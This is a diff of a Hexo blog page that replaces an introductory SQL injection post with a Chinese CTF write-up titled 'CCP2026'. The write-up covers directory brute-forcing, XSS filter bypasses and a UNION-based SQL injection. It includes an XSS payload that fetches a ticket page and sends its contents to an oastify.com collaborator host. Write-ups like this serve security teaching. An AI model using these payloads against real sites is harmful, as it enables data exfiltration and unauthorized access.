@@ -19,24 +19,40 @@
   <meta name="author" content="sport lin">
   <meta name="keywords" content="">
   
-    <meta name="description" content="什么是sql注入所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。简单来说就是通过构造一条精巧的语句，来查询到想要得到的信息。 注入分类按照查询字段  字符型: 当输入的参数为字符串时，称为字符型。 数字型: 当输入的参数为整形时，可以认为是数字型注入。  按照注入方法  Union注入">
+    <meta name="description" content="一、目录爆破与敏感信息泄露对目标进行目录爆破，获得账号密码   登陆后在授权许可处发现flag  二、XSS 跨站脚本与越权访问随便注册一个账号，利用&lt;script&gt;alert(1)&lt;&#x2F;script&gt;,探测，发现有黑名单过滤，  尝试其他绕过方法 1&lt;svg onload&#x3D;alert(1)&gt;  1&lt;iframe src&#x3D;&quot;javascript:a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入基础">
-<meta property="og:url" content="https://linsport.github.io/2025/11/30/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="CCP2026">
+<meta property="og:url" content="https://linsport.github.io/2026/09/19/%E5%85%B6%E4%BB%96/CCP2026/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="什么是sql注入所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。简单来说就是通过构造一条精巧的语句，来查询到想要得到的信息。 注入分类按照查询字段  字符型: 当输入的参数为字符串时，称为字符型。 数字型: 当输入的参数为整形时，可以认为是数字型注入。  按照注入方法  Union注入">
+<meta property="og:description" content="一、目录爆破与敏感信息泄露对目标进行目录爆破，获得账号密码   登陆后在授权许可处发现flag  二、XSS 跨站脚本与越权访问随便注册一个账号，利用&lt;script&gt;alert(1)&lt;&#x2F;script&gt;,探测，发现有黑名单过滤，  尝试其他绕过方法 1&lt;svg onload&#x3D;alert(1)&gt;  1&lt;iframe src&#x3D;&quot;javascript:a">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://linsport.github.io/img/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/less1-1.png">
-<meta property="og:image" content="https://linsport.github.io/img/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/less1-2.png">
-<meta property="article:published_time" content="2025-11-29T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-30T16:10:45.543Z">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan1.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan2.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan3.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss1.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss2.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss3.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss4.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss5.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/xss6.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql1.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql2.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql3.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql4.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql5.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql6.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql7.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql8.png">
+<meta property="og:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/sql9.png">
+<meta property="article:published_time" content="2026-09-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-30T04:50:06.062Z">
 <meta property="article:author" content="sport lin">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://linsport.github.io/img/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/less1-1.png">
+<meta name="twitter:image" content="https://linsport.github.io/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan1.png">
   
   
   
-  <title>sql注入基础 - Hexo</title>
+  <title>CCP2026 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +223,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="sql注入基础"></span>
+            <span id="subtitle" data-typed-text="CCP2026"></span>
           
         </div>
 
@@ -218,8 +234,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-11-30 00:00" pubdate>
-          2025年11月30日 凌晨
+        <time datetime="2026-09-19 00:00" pubdate>
+          2026年9月19日 凌晨
         </time>
       </span>
     
@@ -230,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          509 字
+          477 字
         
       </span>
     
@@ -241,7 +257,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -278,34 +294,57 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">sql注入基础</h1>
+            <h1 id="seo-header">CCP2026</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。<br>简单来说就是通过<strong>构造一条精巧的语句，来查询到想要得到的信息。</strong></p>
-<h1 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h1><p><strong>按照查询字段</strong></p>
-<ul>
-<li>字符型: 当输入的参数为字符串时，称为字符型。</li>
-<li>数字型: 当输入的参数为整形时，可以认为是数字型注入。</li>
-</ul>
-<p><strong>按照注入方法</strong></p>
-<ul>
-<li>Union注入</li>
-<li>报错注入</li>
-<li>布尔注入</li>
-<li>时间注入</li>
-</ul>
-<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><ul>
-<li>查找注入点(URL参数，表单输入，HTTP 头部等)</li>
-<li>判断是字符型还是数字型注使用<code>and1=1和and1=2</code>等来判断</li>
-<li>如果字符型，找到他的闭合方式<code>&#39; </code> <code>&#39;)</code> <code>&quot;</code></li>
-<li>判断查询列数，<code>group by</code> <code>order·by</code></li>
-<li>查询回显位置</li>
-</ul>
-<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>下面我通过一个简单的例子来讲解上述步骤<br>首先打开sqli-labs靶场less1<br><img src="/img/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/less1-1.png" srcset="/img/loading.gif" lazyload alt="靶场"></p>
-<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>利用HackBar提交一个参数来判断是字符型还是数字型注，发现页面正常显示，那么该题就是<strong>字符型</strong><br><img src="/img/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/less1-2.png" srcset="/img/loading.gif" lazyload alt="页面"><br><strong>那么这边为什么会是字符型呢？</strong><br>因为如果是字符型的话，<code>1=2</code>就不存在数学逻辑关系，而单单只是<code>1=2</code>这个字符。<br><strong>如果他是数字型呢？</strong><br>如果它是数字型那么<code>1=2</code>就会存在数学逻辑判断，被判断为假，因为1&#x3D;2显然不成立，因此页面不会正常显示。<br><strong>由此可以得出一个快速判断的方法</strong><br>提交<code>?id=2-1</code>参数，如果它是字符型，那么页面就会出现与<code>id=2</code>时相同的回显。如果他是数字型，那么页面就会出现与<code>id=1</code>时相同的回显。<strong>因为在字符型下不存在数学逻辑运算。</strong></p>
-<h2 id="寻找闭合方式"><a href="#寻找闭合方式" class="headerlink" title="寻找闭合方式"></a>寻找闭合方式</h2>
+                <h1 id="一、目录爆破与敏感信息泄露"><a href="#一、目录爆破与敏感信息泄露" class="headerlink" title="一、目录爆破与敏感信息泄露"></a>一、目录爆破与敏感信息泄露</h1><p>对目标进行目录爆破，获得账号密码</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan2.png" srcset="/img/loading.gif" lazyload></p>
+<p>登陆后在授权许可处发现<code>flag</code></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/dirscan3.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="二、XSS-跨站脚本与越权访问"><a href="#二、XSS-跨站脚本与越权访问" class="headerlink" title="二、XSS 跨站脚本与越权访问"></a>二、XSS 跨站脚本与越权访问</h1><p>随便注册一个账号，利用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,探测，发现有黑名单过滤，</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss1.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试其他绕过方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>当尝试<code>&lt;input onfocus=alert(1) autofocus&gt;</code>时，页面未出现转义渲染。因此确定绕过姿势。同时发现工单号对应着<code>?id</code>里的数值并且工单号并不是从0开始，因此可以推断flag可能才在这些<code>id</code>里，尝试访问<code>id=1</code>却无权访问。</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss2.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以继续尝试利用<code>xss</code>漏洞进行越权。</p>
+<p>利用bp协作器，然后构造如下<code>payload</code>，验证页面是否存在<code>xss</code>漏洞</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;new Image().src=&#x27;https://9dnglmnpp6nytv8vd5g7jubf86ey2qqf.oastify.com/?r=1&#x27;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>进行测试</p>
+<p>成功响应</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss3.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;fetch(&#x27;/api/ticket_detail.php?id=1&#x27;).then(r=&gt;r.text()).then(d=&gt;new Image().src=&#x27;https://9dnglmnpp6nytv8vd5g7jubf86ey2qqf.oastify.com/?d=&#x27;+encodeURIComponent(d))&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现被转义，因此推断<code>fetch</code>也处于黑名单中，多次尝试后。</p>
+<p>构造出如下<code>payload</code>绕过限制获取<code>flag</code></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss5.png" srcset="/img/loading.gif" lazyload></p>
+<p>解码后得到<code>flag</code></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/xss6.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="三、SQL-注入"><a href="#三、SQL-注入" class="headerlink" title="三、SQL 注入"></a>三、SQL 注入</h1><p>随便注册一个账号登陆，尝试在搜索工单处经行<code>sql</code>注入，发现被被过滤。</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql1.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试更改个人资料来进行注入，发现更改完后在个人统计处系统会自动执行查询语句，查询当前用户的个人统计</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql2.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此判断此处存在<code>sql</code>注入点，且闭合为单引号。利用<code>group by</code>探测回显列数，</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql3.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现列数为2，因此继续构造联合注入语句查询表名</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql5.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中<code>secrets</code>表名可能含有flag，继续构造语句查询</p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql7.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现确实如此，构造语句获取<code>flag</code></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%85%B6%E4%BB%96/CCP2026/sql9.png" srcset="/img/loading.gif" lazyload></p>
+
                 
               </div>
             
@@ -323,7 +362,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/sql/" class="category-chain-item">sql</a>
+  <a href="/categories/other/" class="category-chain-item">other</a>
   
   
 
@@ -343,8 +382,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>sql注入基础</div>
-      <div>https://linsport.github.io/2025/11/30/sql/sql注入基础/</div>
+      <div>CCP2026</div>
+      <div>https://linsport.github.io/2026/09/19/其他/CCP2026/</div>
     </div>
     <div class="license-meta">
       
@@ -356,7 +395,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年11月30日</div>
+          <div>2026年9月19日</div>
         </div>
       
       
@@ -388,18 +427,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/12/01/ctf/ISCTF2025/" title="ISCTF2025">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ISCTF2025</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/11/29/c%E8%AF%AD%E8%A8%80/c%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/c%E8%AF%AD%E8%A8%80%E6%8E%92%E5%BA%8F%E6%B3%95/" title="c语言排序法">
-                        <span class="hidden-mobile">c语言排序法</span>
+                      <a href="/2026/09/15/ctf/KPCTF2026/" title="KPCTF2026">
+                        <span class="hidden-mobile">KPCTF2026</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
